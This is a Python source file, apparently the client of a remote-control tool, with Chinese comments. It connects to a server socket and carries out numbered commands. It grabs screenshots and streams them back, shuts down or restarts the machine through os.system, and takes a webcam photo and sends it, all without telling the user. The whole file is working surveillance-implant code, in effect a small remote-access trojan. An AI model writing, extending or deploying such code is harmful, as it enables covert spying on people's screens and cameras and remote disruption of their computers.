import os,socket
import sys

import cv2
from PIL import ImageGrab        #pip install pillow

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('127.0.0.1', 8080))
command = s.recv(1024).decode()
if command == '1':
    while True:
        img = ImageGrab.grab()
        img = img.resize((600, 420))
        img.save('test.jpg')
        # img_cv = cv2.imread('test.jpg')  #读取截图的图片
        #cv2.imshow('test', img_cv)
        # cv2.waitKey(0)  #等待用户按下任意键结束，0表示按任意键，函数的返回值为按下键的ASCII码值
        # cv2.destroyAllWindows() #关闭所有由openCV创建的窗口，清理资源释放空间
        filesize = os.path.getsize('test.jpg')
        #s.send(str(filesize).encode())
        s.send(f"{str(filesize): <10}".encode())
        # while cur_size < filesize:
        with open('test.jpg', 'rb') as f:
            data = f.read()
            s.sendall(data)
            #s.send(data)
elif command == '2':
    os.system("shutdown /s -t 60")
elif command == '3':
    os.system("shutdown /r -t 60")
elif command == '4':
    cap = cv2.VideoCapture(0)   #打开摄像头
    try :
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('person.jpg', frame)
                file_size = os.path.getsize('person.jpg')
                s.send(f"{str(file_size): <10}".encode())

                with open('person.jpg', 'rb') as f:
                    data = f.read()
                    s.sendall(data)
    finally:
        cap.release()

    # file_size = os.path.getsize('person.jpg')
    # s.send(str(file_size).encode())

    # with open('person.jpg', 'rb') as f:
    #     data = f.read()
    #     s.sendall(data)
elif command == '5':
    sys.exit(0)

s.close()